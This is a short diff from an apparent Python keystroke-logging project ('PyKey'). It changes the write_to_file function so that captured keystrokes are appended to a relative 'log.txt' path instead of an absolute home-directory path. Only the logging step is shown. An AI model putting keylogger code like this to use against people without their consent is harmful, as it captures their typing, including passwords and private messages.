@@ -31,7 +31,7 @@ def write_to_file(key):
     if letter == 'Key.delete':
         letter = ' DELETE '
     # print(letter)     # If you want to print results in terminal.
-    with open('/home/fibonnaci/Documents/Python/Python Projects/PyKey/log.txt', 'a') as f:
+    with open('log.txt', 'a') as f:
         f.write(letter)
 
 
